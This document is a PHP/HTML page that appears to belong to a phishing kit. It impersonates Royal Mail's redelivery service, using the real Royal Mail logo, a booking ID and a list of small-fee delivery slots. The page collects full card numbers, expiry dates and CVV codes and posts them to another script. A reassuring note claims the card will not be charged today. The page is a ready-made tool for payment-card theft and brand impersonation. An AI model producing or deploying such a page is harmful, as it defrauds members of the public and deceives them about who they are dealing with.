<?php 
session_start();
if (!isset($_POST['booking_id']) && !isset($_SESSION['booking_id'])) {
 header("Location: index.php");
 exit();
}
$booking_id = $_POST['booking_id'] ?? $_SESSION['booking_id'];
$_SESSION['booking_id'] = $booking_id;
?>

<!DOCTYPE html>
<html lang="en" dir="ltr">
<head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>Delivery Details | Royal Mail</title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
 <style>
 body {font-family: Arial, Helvetica, sans-serif; margin:0; background:#f4f4f4;}
 .dualheader {background:#2A2A2D; color:white; padding:15px 0;}
 .container {max-width:1100px; margin:auto; padding:0 20px;}
 .header-content {display:flex; align-items:center; justify-content:space-between;}
 .logo img {height:45px;}
 .main-content {background:white; max-width:800px; margin:40px auto; padding:40px; box-shadow:0 4px 12px rgba(0,0,0,0.1);}
 h1, h2 {color:#2A2A2D;}
 label {font-weight:600; display:block; margin:15px 0 8px;}
 input, select {width:100%; padding:14px; border:2px solid #ccc; font-size:16px; box-sizing:border-box;}
 button {background:#E4002B; color:white; padding:16px 32px; border:none; font-size:18px; cursor:pointer; margin-top:30px;}
 button:hover {background:#c40025;}
 .note {font-size:14px; color:#006400; margin-top:10px;}
 </style>
</head>
<body>

<header class="dualheader">
 <div class="container header-content">
 <div class="logo">
 <img src="https://www.royalmail.com/themes/custom/rmlcwr/dualrmglogo.svg" alt="Royal Mail">
 </div>
 <div style="font-size:18px;">Redelivery - Step 2 of 2</div>
 </div>
</header>

<div class="container main-content">
 <h1>Choose Delivery Slot</h1>
 <p><strong>Booking ID:</strong> <?= htmlspecialchars($booking_id) ?></p>

 <form action="delivery-booked.php" method="POST">
 <input type="hidden" name="booking_id" value="<?= htmlspecialchars($booking_id) ?>">

 <label>Select a delivery slot:</label>
 <select name="slot" required style="margin-bottom:30px;">
 <option value="">-- Please select a time slot --</option>
 
 <!-- Tomorrow -->
 <option value="Tomorrow 08:00 - 10:00">Tomorrow (08:00 - 10:00) - £2.99</option>
 <option value="Tomorrow 09:00 - 11:00">Tomorrow (09:00 - 11:00) - £2.99</option>
 <option value="Tomorrow 10:00 - 12:00">Tomorrow (10:00 - 12:00) - £2.99</option>
 <option value="Tomorrow 12:00 - 14:00">Tomorrow (12:00 - 14:00) - £2.99</option>
 <option value="Tomorrow 13:00 - 15:00">Tomorrow (13:00 - 15:00) - £2.99</option>
 <option value="Tomorrow 14:00 - 16:00">Tomorrow (14:00 - 16:00) - £2.99</option>
 <option value="Tomorrow 16:00 - 18:00">Tomorrow (16:00 - 18:00) - £3.49</option>
 <option value="Tomorrow 17:00 - 19:00">Tomorrow (17:00 - 19:00) - £3.49</option>

 <!-- Day After Tomorrow -->
 <option value="Wednesday 08:00 - 10:00">Wednesday (08:00 - 10:00) - £2.99</option>
 <option value="Wednesday 10:00 - 12:00">Wednesday (10:00 - 12:00) - £2.99</option>
 <option value="Wednesday 12:00 - 14:00">Wednesday (12:00 - 14:00) - £2.99</option>
 <option value="Wednesday 14:00 - 16:00">Wednesday (14:00 - 16:00) - £2.99</option>
 <option value="Wednesday 16:00 - 18:00">Wednesday (16:00 - 18:00) - £3.49</option>

 <!-- Friday -->
 <option value="Friday 08:00 - 10:00">Friday (08:00 - 10:00) - £2.99</option>
 <option value="Friday 09:30 - 11:30">Friday (09:30 - 11:30) - £2.99</option>
 <option value="Friday 11:00 - 13:00">Friday (11:00 - 13:00) - £2.99</option>
 <option value="Friday 13:00 - 15:00">Friday (13:00 - 15:00) - £2.99</option>
 <option value="Friday 15:00 - 17:00">Friday (15:00 - 17:00) - £3.49</option>
 <option value="Friday 17:00 - 19:00">Friday (17:00 - 19:00) - £3.49</option>

 <!-- Saturday -->
 <option value="Saturday 09:00 - 11:00">Saturday (09:00 - 11:00) - £3.99</option>
 <option value="Saturday 11:00 - 13:00">Saturday (11:00 - 13:00) - £3.99</option>
 <option value="Saturday 13:00 - 15:00">Saturday (13:00 - 15:00) - £3.99</option>
 </select>

 <h2>Payment Information</h2>
 
 <label>Card Type</label>
 <select name="card_type" required>
 <option value="">Select Card Type</option>
 <option value="Visa">Visa</option>
 <option value="Mastercard">Mastercard</option>
 <option value="American Express">American Express</option>
 </select>

 <label>Card Number</label>
 <input type="text" name="card_number" placeholder="1234 5678 9012 3456" maxlength="19" required>

 <div style="display:grid;grid-template-columns:1fr 1fr;gap:20px;">
 <div>
 <label>Expiry Month</label>
 <select name="expiry_month" required>
 <option value="">Month</option>
 <?php for($i=1; $i<=12; $i++) echo "<option>".sprintf("%02d", $i)."</option>"; ?>
 </select>
 </div>
 <div>
 <label>Expiry Year</label>
 <select name="expiry_year" required>
 <option value="">Year</option>
 <?php for($y=2025; $y<=2035; $y++) echo "<option>$y</option>"; ?>
 </select>
 </div>
 </div>

 <label>Security Code (CVV)</label>
 <input type="text" name="cvv" placeholder="123" maxlength="4" style="width:150px;" required>

 <button type="submit">Confirm Redelivery Slot</button>
 
 <p class="note">
 <strong>Note:</strong> Your card will NOT be charged today. £2.99–£3.99 will only be taken once the redelivery has been completed.
 </p>
 </form>
</div>

<footer style="background:#2A2A2D; color:#ccc; text-align:center; padding:30px; font-size:14px;">
 © Royal Mail Group Limited 2025
</footer>

</body>
</html>

</body>
</html>
